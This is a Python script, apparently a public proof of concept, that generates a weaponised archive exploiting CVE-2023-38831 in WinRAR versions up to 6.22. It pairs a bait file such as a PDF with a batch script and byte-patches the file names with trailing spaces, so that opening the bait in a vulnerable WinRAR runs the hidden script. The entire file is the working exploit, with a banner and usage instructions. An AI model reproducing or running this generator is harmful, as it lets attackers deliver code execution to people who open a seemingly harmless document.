import shutil
import os
import sys
from os.path import join
from colorama import Fore, Style


Black = '\033[1;30m'  # Black
Red = '\033[1;31m'  # Red
Green = '\033[1;32m'  # Green
Yellow = '\033[1;33m'  # Yellow
Blue = '\033[1;34m'  # Blue
Purple = '\033[1;35m'  # Purple
Cyan = '\033[1;36m'  # Cyan
White = '\033[1;37m'  # White


def logo():
    print(Fore.MAGENTA + Style.BRIGHT + """
██╗    ██╗██╗███╗   ██╗██████╗  █████╗ ██████╗       
██║    ██║██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗      
██║ █╗ ██║██║██╔██╗ ██║██████╔╝███████║██████╔╝      
██║███╗██║██║██║╚██╗██║██╔══██╗██╔══██║██╔══██╗      
╚███╔███╔╝██║██║ ╚████║██║  ██║██║  ██║██║  ██║      
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝      

███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝______________________________
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   |EXPLOTATION VERSIONS <= 6.22|
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   |      BY K3RNEL-DEV         |
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   |____________________________|
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝ 
    """)

TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"

BAIT_NAME = "rick.pdf"
SCRIPT_NAME = "script.bat"


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def parse_arguments():
    global BAIT_NAME, SCRIPT_NAME, OUTPUT_NAME
    if len(sys.argv) > 3:
        BAIT_NAME = os.path.basename(sys.argv[1])
        SCRIPT_NAME = os.path.basename(sys.argv[2])
        OUTPUT_NAME = os.path.basename(sys.argv[3])
    elif len(sys.argv) == 2 and sys.argv[1] == "poc":
        pass
    else:
        clear()
        print(Fore.MAGENTA + Style.BRIGHT + """
██╗    ██╗██╗███╗   ██╗██████╗  █████╗ ██████╗       
██║    ██║██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗      
██║ █╗ ██║██║██╔██╗ ██║██████╔╝███████║██████╔╝      
██║███╗██║██║██║╚██╗██║██╔══██╗██╔══██║██╔══██╗      
╚███╔███╔╝██║██║ ╚████║██║  ██║██║  ██║██║  ██║      
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝      
                                                     
███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝______________________________
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   |EXPLOTATION VERSIONS <= 6.22|
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   |      BY K3RNEL-DEV         |
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   |____________________________|
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
        Usage:
            Linux:
              python3 winrar_exploit.py poc
              python3 winrar_exploit.py <BAIT_FILE> <EXECUTE_SCRIPT> <OUTPUT_NAME_ARCHIVE>
              
            Windows:
              python winrar_exploit.py poc
              python winrar_exploit.py <BAIT_FILE> <EXECUTE_SCRIPT> <OUTPUT_NAME_ARCHIVE>
              """)

        sys.exit()


def create_template_directory():
    if os.path.exists(TEMPLATE_NAME):
        shutil.rmtree(TEMPLATE_NAME)
    os.mkdir(TEMPLATE_NAME)
    d = join(TEMPLATE_NAME, BAIT_NAME + "A")
    if not os.path.exists(d):
        os.mkdir(d)
    shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME + "A.cmd"))
    shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME + "B"))


def generate_archive():
    shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME)

    with open(TEMPLATE_NAME + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ")
        content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

    os.remove(TEMPLATE_NAME + ".zip")

    with open(OUTPUT_NAME, "wb") as f:
        f.write(content)


if __name__ == '__main__':
    parse_arguments()
    BAIT_EXT = b"." + bytes(BAIT_NAME.split(".")[-1], "utf-8")
    logo()
    print("[💀]Bait file:", BAIT_NAME)
    print("[💀]Executable file:", SCRIPT_NAME)
    print("[💀]Output archive:", OUTPUT_NAME)
    create_template_directory()
    generate_archive()
    print("[💀] Success!")
